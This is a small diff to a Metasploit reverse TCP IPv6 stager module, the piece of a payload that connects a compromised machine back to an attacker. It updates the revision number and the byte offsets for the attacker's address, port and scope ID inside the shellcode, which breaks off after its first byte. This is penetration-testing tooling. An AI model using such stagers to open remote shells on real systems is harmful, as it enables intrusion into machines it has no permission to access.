@@ -1,5 +1,5 @@
 ##
-# $Id: reverse_ipv6_tcp.rb 6677 2009-06-20 04:35:44Z hdm $
+# $Id: reverse_ipv6_tcp.rb 6744 2009-07-05 20:24:37Z hdm $
 ##
 
 ##
@@ -27,7 +27,7 @@ module Metasploit3
 
 		super(merge_info(info,
 			'Name'          => 'Reverse TCP Stager (IPv6)',
-			'Version'       => '$Revision: 6677 $',
+			'Version'       => '$Revision: 6744 $',
 			'Description'   => 'Connect back to the attacker over IPv6',
 			'Author'        => ['hdm', 'skape'],
 			'License'       => MSF_LICENSE,
@@ -39,9 +39,9 @@ module Metasploit3
 				{
 					'Offsets' =>
 						{
-							'LHOST'   => [ 248+1, 'ADDR6' ],
-							'LPORT'   => [ 242+1, 'n'     ],
-							'SCOPEID' => [ 264+1, 'V'     ]
+							'LHOST'   => [ 278+1, 'ADDR6' ],
+							'LPORT'   => [ 272+1, 'n'     ],
+							'SCOPEID' => [ 294+1, 'V'     ]
 						},
 					'Payload' =>
 						"\xfc" +
